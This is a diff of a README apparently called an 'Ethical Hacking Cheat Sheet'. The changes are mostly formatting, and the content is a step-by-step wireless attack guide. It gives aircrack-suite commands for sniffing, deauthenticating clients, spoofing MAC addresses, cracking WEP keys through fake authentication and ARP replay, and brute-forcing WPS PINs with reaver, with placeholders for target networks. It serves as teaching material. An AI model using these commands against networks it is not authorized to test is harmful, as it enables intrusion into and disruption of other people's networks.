@@ -1,17 +1,21 @@
 # Ethical Hacking Cheat Sheet
-<details style='color:yellow'>
+
+<details>
     <summary> Basic Information</summary>
 These commands are works only on linux based OS system
 An external Network Adapter is required, Your Network Adapter must support
-{ Monitor Mode, packet injection } mode Here my network interface name is { wlan1 }, use these commands 
+{ Monitor Mode, packet injection } mode Here my network interface name is { wlan1 }, use these commands
 
 ```sh
 iwconfig 
 ```
- or 
+
+ or
+
  ```
  ifconfig
  ```
+
 check your network interface name, your network interface name may be diffrent use accordingly.
 
 First you need to switch root user
@@ -19,46 +23,57 @@ First you need to switch root user
 ```
 sudo su
 ```
+
 </details>
 
 # Table of Content
+
 - [Network Manager Commands](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#network-manager-commands)
 - [Network Adapter testing commands](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#network-adapter-testing-commands)
 - [Changing MAC Address](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#changing-mac-address)
 - [Network Hacking](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#network-hacking)
-    * [1. Pre-Connection Attack](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#1-pre-connection-attack-1)
-        * Packet Sniffing
-        * De-Authentication Attack
-    * [2. Ganing Access](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#2-gaining-access)
-        * WEP Cracking
-        * WPA / WPA2 Cracking
-    * [3. Post-Connection Attack]()
-
-
-
+  - [1. Pre-Connection Attack](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#1-pre-connection-attack-1)
+    - Packet Sniffing
+    - De-Authentication Attack
+  - [2. Ganing Access](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#2-gaining-access)
+    - WEP Cracking
+    - WPA / WPA2 Cracking
+  - [3. Post-Connection Attack]()
 
 ---
+
 ## Network Manager Commands
+
  Kill Network Manager
+
 ```
 airmon-ng check kill
 ```
+
  Enable Network Manager
+
 ```
 service NetworkManager start
 ```
+
  Restart Network Manager
+
 ```
 systemctl restart NetworkManager
 ```
+
  Check Status of Network Manager
+
 ```
 systemctl status NetworkManager
 ```
+
 ---
+
 ## Network Adapter Testing Commands
+
  Enable Monitor Mode
-<details style='color:yellow'>
+<details>
     <summary>Why we need to enable monitor mode ?</summary>
 we want is to be able to capture all the packets
 that are within our range,
@@ -70,26 +85,37 @@ So to do this, we need to set our network adapter to the monitor mode
 ```
 airmon-ng start wlan1
 ```
+
  Disable Monitor Mode
+
 ```
 airmon-ng stop wlan1
 ```
+
  Packet Injection test
+
 ```
 aireplay-ng --test wlan1
 ```
+
  Access Point Creation Test
 you can put any fake MAC Address like this `00:01:02:03:04:05`
+
 ```
 airbase-ng -a 00:01:02:03:04:05 --essid "test_01" -c 11 wlan1
 ```
+
 ---
+
 # Network Hacking
 
 ### [1. Pre-Connection Attack](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#1-pre-connection-attack-1)
+
 ### [2. Ganing Access](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#2-gaining-access)
+
 ### [3. Post-Connection Attack]()
-<details style='color:yellow'>
+
+<details>
     <summary>What is MAC Address ?</summary>
 MAC address stands for Media Access Control,
 it's a permanent, physical, and unique address
@@ -136,19 +162,27 @@ and you will also be able to hide your identity.
 </details>
 
 ### Changing MAC Address
+
 1. step
+
 ```
 ifconfig
 ```
+
 2. step
+
 ```
 ifconfig wlan1 down
 ```
-3. step ( you can assign any MAC Address, just make sure your address starts with 00 ) 
+
+3. step ( you can assign any MAC Address, just make sure your address starts with 00 )
+
 ```
 ifconfig wlan1 hw ether 00:11:22:33:44:55
 ```
+
 4. step
+
 ```
 ifconfig wlan1 up
 ```
@@ -163,15 +197,19 @@ ifconfig wlan1 down
 ifconfig wlan1 hw ether 00:11:22:33:44:55
 ifconfig wlan1 up
 ```
+
 ---
+
 # 1. Pre-Connection Attack
-<details style='color:yellow'>
+
+<details>
     <summary>What is Pre-Connection Attack ?</summary>
 A pre-connection attack is like a sneak attack on a computer or network before any proper connection is established. It's when a hacker tries to break into a system without actually logging in or getting permission. They might do this by scanning for vulnerabilities or trying to guess passwords. It's a bit like trying to break into a house before you even knock on the door.
 </details>
 
 ### Packet Sniffing
-<details style='color:yellow'>
+
+<details>
     <summary>What is Packet Sniffing ?</summary>
 Now that we have enabled monitor mode
 on our wireless interface,
@@ -196,31 +234,42 @@ the clients connected to this network, and so on.
 </details>
 
  Sniff Network around `2.4 GHz`
+
 ```
 airodump-ng wlan1
 ```
+
  Sniff Network Both `2.4 GHz and 5 GHz`
+
 ```
 airodump-ng --band a wlan1
 ```
+
  Capture data both `2.4 GHz and 5 GHz`
+
 ```
 airodump-ng --band abg wlan1
 ```
+
  Capture data in a file `test`
+
 ```
 airodump-ng --bssid @1 --channel @2 --write test wlan1
 ```
+
 @1 → `BSSID` of target
 
 @2 → Channel no. of target
 
- Open wireshark application to read captured data, captured in `test.cap`, 
+ Open wireshark application to read captured data, captured in `test.cap`,
+
 ```
 wireshark
 ```
-### DE-Authentication Attack 
-<details style='color:yellow'>
+
+### DE-Authentication Attack
+
+<details>
     <summary>What is de-authentication attack ?</summary>
 This attack allow us to disconnect any device,
 from any network, before connecting to any of these networks
@@ -242,18 +291,19 @@ we're gonna use a tool called { aireplay-ng }to do that.
 ```
 aireplay-ng --deauth @1 -a @2 -c @3 wlan1
 ```
-@1 → no. of packets you want to send 
+
+@1 → no. of packets you want to send
 
 @2 → BSSID of router
 
 @3 → MAC Address of the Client
 
-
-
 if it`s fails then, target router on specfic channel
+
 ```
 airodump-ng --bssid @1 --channel @2 wlan1
 ```
+
 @1 → BSSID of target
 
 @2 → Channel number
@@ -261,10 +311,11 @@ airodump-ng --bssid @1 --channel @2 wlan1
 ---
 
 # 2. Gaining Access
-<details style='color:yellow'>
+
+<details>
     <summary>What is Gaining Acess ?</summary>
 Once`s we connect to the network, we can do so many cool things. we will able to gather so much more info, we will be able to intercept the connection and see every things that the people sends whether it user name, passward, url and anything.
-And we will be able to modify data. 
+And we will be able to modify data.
 &nbsp;
 
 if your target does not use encryption then you just connect to it. if your target is wired network  then just use cable and connect to it.
@@ -275,7 +326,7 @@ The only problem is if your target using encryption.
 
 # WEP Cracking
 
-<details style='color:yellow'>
+<details>
     <summary>Know about WEP ?</summary>
 <br/>
 ● Wired Equivalent Privacy. <br />
@@ -304,9 +355,11 @@ Result:<br />
 <br />
 Conclusion:<br />
 To crack WEP we need to:<br />
+
 1. Capture a large number of packets/IVs. → using airodump-ng<br />
 2. Analyse the captured IVs and crack the key. → using aircrack-ng<br />
 <br />
+
 Problem:<br />
 ● If network is not busy.<br />
 ● It would take some time to capture enough IVs.<br />
@@ -326,11 +379,13 @@ ARP Request Replay<br />
 ● This causes the AP to produce another packet with a new IV.<br />
 ● Keep doing this till we have enough IVs to crack the key.<br />
 </details>
- 
+
 First you need top capture data.
+
 ```
 airodump-ng --bssid @1 --channel @2 --write basic_wep wlan1
 ```
+
 @1 → bssid of target router
 
 @2 → channel no.
@@ -340,19 +395,26 @@ basic_web → file name
 We need to capture large no. of data, so that we are easily able crack key.
 
 ### WEP Cracking using capture file `basic_wep.cap`
+
 ```
 aircrack-ng basic_wep-01.cap
 ```
+
 You Found Key like this `41:73:32:33:70`
 remove colon behind the number `41:73:32:33:70` → `4173323370` is you cracked key.
 
 ---
 if your target network is not busy, `we need network busy to capture the data, to crack the key` the solution is to force the AP to generate new packets with new IVs, because by default AP ingnore the request they get unless the device connect to the network or associated with it,
+
 ### Fake-Authentication Attack
-do parlelly bottom three commnads
+
+> [!NOTE]\
+> do parlelly bottom three commnads
+
 ```
 airodump-ng --bssid @1 --channel @2 --write basic_wep wlan1
 ```
+
 @1 → bssid of target router
 
 @2 → channel no.
@@ -362,6 +424,7 @@ airodump-ng --bssid @1 --channel @2 --write basic_wep wlan1
 ```
 aireplay-ng --fakeauth 0 -a @1 -h @2 waln1
 ```
+
 @1 → bssid of target
 
 @2 → Your wireless network adapter MAC Address, use `iwconfig`.<br/>
@@ -372,17 +435,22 @@ here `--fakeauth 0` becuse we just need to associate with network once `--arprel
 ```
 aireplay-ng --arpreplay -b @1 -h @2 waln1
 ```
+
 @1 → bssid of target
 
 @2 → Your wireless network adapter MAC Address, use `iwconfig`.<br/>
 
 and then again do WEP Cracking
+
 ```
 aircrack-ng basic_wep-01.cap
 ```
+
 ---
+
 # WPA / WPA2 Cracking
-<details style='color:yellow'>
+
+<details>
     <summary>more about WPA / WPA2</summary>
 <br/>
 ● Both can be cracked using the same methods<br/>
@@ -411,17 +479,21 @@ not.<br/>
 </details>
 
 ## WPA / WPA2 Cracking Without Word list
+
 show WPS Enable Network Around us
+
 ```
 wash --interface waln1
 ```
-Fake-Authentication Attack 
 
-==}> do bottom two commands parlelly
+Fake-Authentication Attack
+> [!NOTE]\
+> do bottom two commands parlelly
 
 ```
 aireplay-ng --fakeauth 30 -a @1 -h @2 wlan1
 ```
+
 30 → is delay
 
 @1 → MAC Address of target
@@ -429,48 +501,18 @@ aireplay-ng --fakeauth 30 -a @1 -h @2 wlan1
 @2 → MAC Address of Network interface card in monitor mode.
 
 Brute force the pin
+
 ```
 reaver --bssid @1 --channel @2 --interface wlan1 -vvv --no-associate 
 ```
+
 ---
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 # 3. Post-Connection Attack
-
-
-
-
-
-
-
-
 
 <details>
     <summary></summary>
 
 </details>
 
-# ===}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)
+# ===}> [Keep Supporting me on YouTube ][def]
